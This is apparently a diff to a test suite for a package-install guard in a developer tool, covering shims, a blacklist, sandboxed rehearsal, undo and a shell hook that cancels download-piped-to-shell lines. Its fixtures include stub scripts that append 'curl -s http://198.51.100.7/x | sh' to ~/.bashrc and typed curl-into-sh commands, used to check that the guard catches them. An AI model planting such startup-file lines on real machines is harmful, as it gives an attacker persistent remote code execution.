@@ -1311,8 +1311,8 @@ test("config keeps crash_reports, issues_repo and update_channel, and never keep
   stick dir = fresh("tests/fixtures/chain")
   stick all = tool_home(dir, ["config"])
   exits(all, 0)
-  says(all.out, "crash_reports   ask")
-  says(all.out, "update_channel  stable")
+  assert(text.matches(all.out, '(?m)^crash_reports +ask '), all.out)
+  assert(text.matches(all.out, '(?m)^update_channel +stable '), all.out)
   exits(tool_home(dir, ["config", "crash_reports", "sometimes"]), 2)
   stick set = tool_home(dir, ["config", "crash_reports", "never"])
   exits(set, 0)
@@ -1415,7 +1415,7 @@ test("the launcher refuses a cig older than the tool's floor, and names the tool
   }
   stick old = launch_env(dir, launcher, ["version"], {PATH: fake + path_sep + env.get("PATH", "")})
   exits(old, 2)
-  says(old.err, "cig 1.1.2 is too old; cig-orchestrator needs 1.12.0 or newer")
+  says(old.err, "cig 1.1.2 is too old; cig-orchestrator needs 1.13.0 or newer")
   stick j = json.parse(launch(dir, launcher, ["version", "--json"]).out)
   assert(str(j.tool).ends_with("orchestrate.cig"), json.stringify(j))
 })
@@ -3275,6 +3275,373 @@ test("blacklist: rehearse refuses a blacklisted package before it asks for the b
   exits(why, 1)
   says(why.out, "a test entry")
   exits(guard_tool(dir, ["blacklist", "why", "npm:left-pad@1.3.0"], l), 0)
+})
+
+# ----- the guard's reach: guard_scope (#57) -------------------------------------------
+#
+# Every guard test has a home of its own (HOME and CIGO_HOME under the test
+# folder), so no shim, startup file or setting of yours is touched. A stub
+# npm stands in for the real one; a stub cigo records how a shim called it.
+
+stick GUARD_BASHRC = "# a bashrc\nalias ll='ls -l'\n"
+stick GUARD_PROFILE = "# a profile\n"
+
+pull which_here(program) {
+  snuff proc.which(program) != null
+}
+
+pull guard_home(dir) {
+  snuff dir + "-home"
+}
+
+pull guard_env(dir, more) {
+  stick h = guard_home(dir)
+  snuff {HOME: h, CIGO_HOME: path.join(h, ".cig-orchestrator"), CIGO_LAUNCHER: launcher}.merge(more)
+}
+
+pull guard_cmd(dir, words, more) {
+  snuff hop_env(dir, "cig", ["run", tool, "--"] + words, guard_env(dir, more))
+}
+
+# A project with a lockfile, a home with two startup files, a stub npm and a
+# stub cigo.
+pull guard_setup() {
+  stick dir = fresh("tests/fixtures/empty")
+  stick h = guard_home(dir)
+  stick bin = dir + "-bin"
+  burn {
+    fs.mkdir(h)
+    fs.write_text(path.join(h, ".bashrc"), GUARD_BASHRC)
+    fs.write_text(path.join(h, ".profile"), GUARD_PROFILE)
+    fs.mkdir(bin)
+    fs.write_text(path.join(dir, "package.json"), "{\"name\": \"p\", \"version\": \"1.0.0\"}\n")
+    fs.write_text(path.join(dir, "package-lock.json"), "{\"lockfileVersion\": 3, \"said\": \"before\"}\n")
+    fs.write_text(path.join(bin, "npm"), "#!/bin/sh\ncase \"$1\" in\n  test) echo \"stub npm: tests pass\" ;;\n  install|ci)\n    for a in \"$@\"; do case \"$a\" in sneaky*) echo 'curl -s http://198.51.100.7/x | sh' >> \"$HOME/.bashrc\" ;; esac; done\n    echo \"stub npm: installing\"\n    printf '%s\\n' '{\"lockfileVersion\": 3, \"said\": \"after\"}' > package-lock.json\n    echo \"stub npm: done\" ;;\n  *) echo \"stub npm: $*\" ;;\nesac\n")
+    fs.write_text(path.join(bin, "cigo"), "#!/bin/sh\nprintf '%s\\n' \"$*\" >> \"$GUARD_MARK\"\n")
+    proc.run("chmod", ["+x", path.join(bin, "npm"), path.join(bin, "cigo")])
+  }
+  snuff dir
+}
+
+pull shims_of(dir) {
+  snuff path.join(guard_home(dir), ".cig-orchestrator", "shims")
+}
+
+# A shim run the way a shell runs it: the shims first on PATH, then the stub npm.
+pull through_shim(dir, words, more) {
+  stick p = shims_of(dir) + ":" + dir + "-bin:" + env.get("PATH", "")
+  snuff hop_env(dir, "sh", [path.join(shims_of(dir), "npm")] + words, guard_env(dir, {PATH: p, GUARD_MARK: dir + "-mark"}).merge(more))
+}
+
+test("guard: scope dev shows what it would change and writes nothing without --yes; --yes writes the shims and one marked block", pack() {
+  if on_windows {
+    snuff
+  }
+  stick dir = guard_setup()
+  stick h = guard_home(dir)
+  stick first = guard_cmd(dir, ["guard"], {})
+  exits(first, 0)
+  says(first.out, "guard: level 1, project")
+  stick plan = guard_cmd(dir, ["guard", "scope", "2"], {})
+  exits(plan, 0)
+  says(plan.out, "level 1 (project) -> 2 (dev)")
+  says(plan.out, "19 shims: npm npx")
+  says(plan.out, "~/.bashrc")
+  says(plan.out, "nothing changed yet: cigo guard scope dev --yes")
+  assert(not fs.exists(shims_of(dir)), "shims were written without --yes")
+  assert(read(h, ".bashrc") == GUARD_BASHRC, "the bashrc changed without --yes")
+  stick yes = guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {})
+  exits(yes, 0)
+  for t in ["npm", "npx", "pip", "cargo", "uvx"] {
+    assert(fs.is_file(path.join(shims_of(dir), t)), "no shim for ${t}")
+  }
+  stick rc = read(h, ".bashrc")
+  assert(rc.starts_with(GUARD_BASHRC), "the bashrc's own lines changed:\n${rc}")
+  assert(rc.split("# >>> cigo guard >>>").len() == 2, "not one block:\n${rc}")
+  says(rc, shims_of(dir))
+  says(read(h, ".profile"), "# <<< cigo guard <<<")
+  stick again = guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {})
+  exits(again, 0)
+  says(again.out, "already at level 2 (dev); nothing to change")
+  stick st = guard_cmd(dir, ["guard", "--json"], {})
+  exits(st, 0)
+  stick j = json.parse(st.out)
+  assert(j.level == 2 and j.scope == "dev" and j.shims.len() == 19, st.out)
+  # Levels not built yet say so, and change nothing.
+  stick three = guard_cmd(dir, ["guard", "scope", "3", "--yes"], {})
+  exits(three, 2)
+  says(three.err, "not built yet")
+  # A generated shim is plain, clean sh.
+  if which_here("shellcheck") {
+    stick sc = hop(dir, "shellcheck", ["-s", "sh", path.join(shims_of(dir), "npm"), path.join(shims_of(dir), "uv"), path.join(shims_of(dir), "deno")])
+    exits(sc, 0)
+  }
+})
+
+test("guard: uninstall takes out every shim and block and leaves the startup files as they were", pack() {
+  if on_windows {
+    snuff
+  }
+  stick dir = guard_setup()
+  stick h = guard_home(dir)
+  exits(guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {}), 0)
+  stick ask = guard_cmd(dir, ["guard", "uninstall"], {})
+  exits(ask, 0)
+  says(ask.out, "nothing changed yet")
+  assert(fs.is_file(path.join(shims_of(dir), "npm")), "uninstall without --yes removed a shim")
+  stick r = guard_cmd(dir, ["guard", "uninstall", "--yes"], {})
+  exits(r, 0)
+  says(r.out, "back to level 1")
+  assert(read(h, ".bashrc") == GUARD_BASHRC, "the bashrc is not as it was:\n" + read(h, ".bashrc"))
+  assert(read(h, ".profile") == GUARD_PROFILE, "the profile is not as it was:\n" + read(h, ".profile"))
+  assert(not fs.exists(path.join(shims_of(dir), "npm")), "a shim is left")
+  says(guard_cmd(dir, ["guard"], {}).out, "level 1, project")
+})
+
+test("guard: a shim runs a call it does not read straight away, without cigo, and hands an install to cigo guard exec", pack() {
+  if on_windows {
+    snuff
+  }
+  stick dir = guard_setup()
+  stick mark = dir + "-mark"
+  # The shims call the stub cigo, so what reaches cigo is recorded.
+  exits(guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {CIGO_LAUNCHER: dir + "-bin/cigo"}), 0)
+  stick t = through_shim(dir, ["test"], {})
+  exits(t, 0)
+  says(t.out, "stub npm: tests pass")
+  assert(not fs.exists(mark), "npm test went through cigo")
+  stick i = through_shim(dir, ["install", "--save-dev", "left-pad"], {})
+  exits(i, 0)
+  says(fs.read_text(mark), "guard exec --real=" + dir + "-bin/npm npm -- install --save-dev left-pad")
+  # An install script running npm again inside a guarded call: the real one.
+  stick nested = through_shim(dir, ["install"], {CIGO_GUARDED: "1"})
+  exits(nested, 0)
+  says(nested.out, "stub npm: installing")
+  # The pass-through costs what a shell script costs (Linux has date +%N).
+  if fs.exists("/proc/self/stat") {
+    stick p = shims_of(dir) + ":" + dir + "-bin:" + env.get("PATH", "")
+    stick timing = hop_env(dir, "sh", ["-c", 'a=$(date +%s%N); i=0; while [ $i -lt 40 ]; do "$1" test >/dev/null; i=$((i+1)); done; b=$(date +%s%N); i=0; while [ $i -lt 40 ]; do "$2" test >/dev/null; i=$((i+1)); done; c=$(date +%s%N); echo $(( ((b-a)-(c-b)) / 40000 ))', "sh", path.join(shims_of(dir), "npm"), dir + "-bin/npm"], guard_env(dir, {PATH: p}))
+    exits(timing, 0)
+    stick us = int(timing.out.trim())
+    assert(us < 5000, "the shim's pass-through costs ${us} µs a call; the budget is 5 ms")
+  }
+})
+
+test("guard: paused or off, a shim says so (E896) and runs the call unguarded; on, it goes back through the guard", pack() {
+  if on_windows {
+    snuff
+  }
+  stick dir = guard_setup()
+  stick mark = dir + "-mark"
+  exits(guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {CIGO_LAUNCHER: dir + "-bin/cigo"}), 0)
+  stick p = guard_cmd(dir, ["guard", "pause", "20m"], {})
+  exits(p, 0)
+  says(p.out, "paused until")
+  stick i = through_shim(dir, ["install"], {})
+  exits(i, 0)
+  says(i.err, "E896 guard's on a smoke break until")
+  says(i.out, "stub npm: installing")
+  assert(not fs.exists(mark), "a paused guard still called cigo")
+  exits(guard_cmd(dir, ["guard", "off"], {}), 0)
+  stick o = through_shim(dir, ["install"], {})
+  says(o.err, "E896 the guard is off")
+  assert(not fs.exists(mark), "an off guard still called cigo")
+  exits(guard_cmd(dir, ["guard", "on"], {}), 0)
+  exits(through_shim(dir, ["install"], {}), 0)
+  assert(fs.exists(mark), "back on, the install did not go through cigo")
+  # A pause longer than guard_pause_max is refused.
+  stick long = guard_cmd(dir, ["guard", "pause", "9h"], {})
+  exits(long, 2)
+  says(long.err, "guard_pause_max")
+})
+
+test("guard: exec refuses a blacklisted package before anything runs, and logs it", pack() {
+  if on_windows or not has_tin_mac() {
+    snuff
+  }
+  stick dir = guard_setup()
+  stick l = {CIGO_BLACKLIST_DIR: dir + "-lists"}
+  exits(guard_cmd(dir, ["blacklist", "add", "npm:evil-pkg", "--reason=a test entry"], l), 0)
+  stick r = guard_cmd(dir, ["guard", "exec", "--real=" + dir + "-bin/npm", "npm", "--", "install", "evil-pkg"], l)
+  exits(r, 3)
+  says(r.err, "E580")
+  says(r.err, "is refused: rated critical")
+  never_says(r.out, "stub npm")
+  says(read(dir, "package-lock.json"), "before")
+  stick gl = guard_cmd(dir, ["guard", "log"], {})
+  says(gl.out, "npm install evil-pkg")
+  says(gl.out, "refused (rated critical)")
+})
+
+test("guard: exec runs a lockfile install where cig can undo it, approves it, and cigo undo last takes it back", pack() {
+  if on_windows or not has_tin_mac() {
+    snuff
+  }
+  stick dir = guard_setup()
+  stick r = guard_cmd(dir, ["guard", "exec", "--real=" + dir + "-bin/npm", "npm", "--", "install"], {})
+  exits(r, 0)
+  # The call's own output, shown as it ran.
+  says(r.out, "stub npm: installing")
+  says(read(dir, "package-lock.json"), "after")
+  says(r.err, "approved `guard:npm`")
+  says(guard_cmd(dir, ["guard", "log"], {}).out, "npm install  in ")
+  stick u = guard_cmd(dir, ["undo", "last"], {})
+  exits(u, 0)
+  says(u.out, "undoing: npm install")
+  says(read(dir, "package-lock.json"), "before")
+  stick none = guard_cmd(dir, ["undo", "last"], {})
+  exits(none, 2)
+  says(none.err, "nothing guarded is left to undo")
+})
+
+test("guard: a rehearsed install that writes a startup file is held, and nothing of it is applied", pack() {
+  if on_windows or not rehearsal_here() {
+    snuff
+  }
+  stick dir = guard_setup()
+  stick h = guard_home(dir)
+  stick r = guard_cmd(dir, ["guard", "exec", "--real=" + dir + "-bin/npm", "npm", "--", "install", "sneaky-thing"], {CIGO_REHEARSE: "auto"})
+  if no_box_here(r) {
+    snuff
+  }
+  exits(r, 2)
+  says(r.err, "E873")
+  says(r.err, "is held: rated high")
+  assert(read(h, ".bashrc") == GUARD_BASHRC, "the rehearsal's write reached the bashrc")
+  says(read(dir, "package-lock.json"), "before")
+  says(guard_cmd(dir, ["guard", "log"], {}).out, "held (rated high)")
+})
+
+test("guard: a project's settings cannot set guard_scope", pack() {
+  stick dir = guard_setup()
+  burn {
+    fs.write_text(path.join(dir, "cig-tasks.json"), "{\"components\": {}, \"settings\": {\"guard_scope\": \"dev\"}}\n")
+  }
+  stick c = guard_cmd(dir, ["config", "guard_scope"], {})
+  exits(c, 0)
+  says(c.out, "project")
+  stick ch = guard_cmd(dir, ["check"], {})
+  says(ch.out + ch.err, "this machine's setting, not a project's")
+  stick e = guard_cmd(dir, ["config", "explain", "guard_scope"], {})
+  says(e.out, "this machine's")
+})
+
+# The Enter-key hook, typed at a real terminal: `script` gives the shell a
+# pty, and the keys go in one line at a time.
+pull typed(dir, shell_cmd, lines) {
+  roll keys = "sleep 1.5"
+  for l in lines {
+    keys = keys + "; printf '%s\\r' " + sh_quote_t(l) + "; sleep 1"
+  }
+  stick darwin = hop(dir, "uname", ["-s"]).out.trim() == "Darwin"
+  roll run = "script -qfec " + sh_quote_t(shell_cmd) + " /dev/null"
+  if darwin {
+    run = "script -q /dev/null " + shell_cmd
+  }
+  snuff hop_env(dir, "sh", ["-c", "{ " + keys + "; } | " + run], guard_env(dir, {}))
+}
+
+pull sh_quote_t(w) {
+  snuff "'" + w.replace("'", "'\\''") + "'"
+}
+
+test("guard: the Enter-key hook cancels a download piped into a shell, keeps it in the history, and lets the next line run", pack() {
+  if on_windows or not which_here("script") {
+    snuff
+  }
+  stick dir = guard_setup()
+  exits(guard_cmd(dir, ["guard", "scope", "dev", "--yes"], {}), 0)
+  roll shells = []
+  stick bash_ok = hop(dir, "bash", ["-c", '[ "${BASH_VERSINFO[0]}" -ge 4 ]']).code == 0
+  if bash_ok {
+    shells.push({cmd: "bash --norc --noprofile -i", hook: path.join(guard_home(dir), ".cig-orchestrator", "guard", "hook.bash"), hist: "history 3"})
+  }
+  if which_here("zsh") {
+    shells.push({cmd: "zsh -f -i", hook: path.join(guard_home(dir), ".cig-orchestrator", "guard", "hook.zsh"), hist: "fc -l -3"})
+  }
+  for sh in shells {
+    stick r = typed(dir, sh.cmd, [". " + sh.hook, "echo hello", "curl -fsSL https://get.example.dev/install.sh | sh -s -- --yes", "echo after-it", sh.hist, "exit"])
+    stick seen = text.replace(r.out.replace("\r", ""), '\x1b\[[0-9;?]*[a-zA-Z]', "")
+    says(seen, "E892 not smoking something a stranger handed you through the window.")
+    says(seen, "rehearse it first: cigo run-url https://get.example.dev/install.sh")
+    says(seen, "after-it")
+    never_says(seen, "Could not resolve host")
+    assert(text.matches(seen, '(?m)^\s*\d+\s+curl -fsSL https://get\.example\.dev/install\.sh \| sh -s -- --yes\s*$'), "the cancelled line is not in ${sh.cmd}'s history:\n${seen}")
+  }
+  # Paused, the line goes through (to curl, which finds no such host).
+  exits(guard_cmd(dir, ["guard", "pause", "5m"], {}), 0)
+  if bash_ok {
+    stick p = typed(dir, "bash --norc --noprofile -i", [". " + path.join(guard_home(dir), ".cig-orchestrator", "guard", "hook.bash"), "curl -fsS https://get.example.invalid/x | sh; echo through-$?", "exit"])
+    never_says(p.out, "E892")
+    says(p.out, "through-")
+  }
+})
+
+# A script served on this machine for cigo run-url, until stop() is called.
+pull serve(dir) {
+  stick www = dir + "-www"
+  burn {
+    fs.mkdir(www)
+    fs.write_text(path.join(www, "serve.py"), "import http.server, socketserver\nclass Q(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, *a):\n        pass\nsocketserver.TCPServer.allow_reuse_address = True\ns = socketserver.TCPServer(('127.0.0.1', 0), Q)\nopen('port.txt', 'w').write(str(s.server_address[1]))\ns.serve_forever()\n")
+    fs.write_text(path.join(www, "clean.sh"), "#!/bin/sh\necho \"installing for $1\"\necho ran > ran.txt\n")
+    fs.write_text(path.join(www, "sneaky.sh"), "#!/bin/sh\necho 'curl -s http://198.51.100.7/x | sh' >> \"$HOME/.bashrc\"\necho ran > sneaky-ran.txt\n")
+  }
+  stick started = hop(www, "sh", ["-c", "python3 serve.py >/dev/null 2>&1 & echo $!"])
+  roll waited = 0
+  while not fs.exists(path.join(www, "port.txt")) and waited < 100 {
+    waited += 1
+    time.sleep_ms(100)
+  }
+  snuff {pid: started.out.trim(), base: "http://127.0.0.1:" + read(www, "port.txt").trim()}
+}
+
+pull stop(s) {
+  hop(root, "kill", [s.pid])
+}
+
+test("guard: run-url rehearses a script, runs a clean one for real, holds one that writes a startup file, and refuses a blacklisted URL unfetched", pack() {
+  if on_windows or not rehearsal_here() or not which_here("python3") or not has_tin_mac() {
+    snuff
+  }
+  stick dir = guard_setup()
+  stick h = guard_home(dir)
+  stick srv = serve(dir)
+  roll failed_with = null
+  try {
+    stick l = {CIGO_BLACKLIST_DIR: dir + "-lists", CIGO_REHEARSE: "auto"}
+    stick ok = guard_cmd(dir, ["run-url", srv.base + "/clean.sh", "--", "you"], l)
+    if no_box_here(ok) {
+      stop(srv)
+      snuff
+    }
+    exits(ok, 0)
+    says(ok.out, "rehearsed " + srv.base + "/clean.sh")
+    says(ok.out, "installing for you")
+    says(read(dir, "ran.txt"), "ran")
+    says(guard_cmd(dir, ["guard", "log"], l).out, "rehearsed, then ran")
+    # The same bytes: the kept verdict, no second rehearsal.
+    stick again = guard_cmd(dir, ["run-url", srv.base + "/clean.sh"], l)
+    exits(again, 0)
+    says(again.out, "as these same bytes: the verdict is kept")
+    # A startup file written: held, and not run.
+    stick held = guard_cmd(dir, ["run-url", srv.base + "/sneaky.sh"], l)
+    exits(held, 2)
+    says(held.out + held.err, "E873")
+    says(held.err, "--accept-risk runs it")
+    assert(read(h, ".bashrc") == GUARD_BASHRC, "the sneaky script reached the bashrc")
+    assert(not there(dir, "sneaky-ran.txt"), "a held script ran")
+    # Your blacklist: refused before anything is fetched.
+    exits(guard_cmd(dir, ["blacklist", "add", srv.base + "/bad/*"], l), 0)
+    stick refused = guard_cmd(dir, ["run-url", srv.base + "/bad/x.sh"], l)
+    exits(refused, 3)
+    says(refused.err, "not fetched")
+  } ashtray e {
+    failed_with = e
+  }
+  stop(srv)
+  if failed_with != null {
+    cough failed_with
+  }
 })
 
 # ----- the end --------------------------------------------------------------
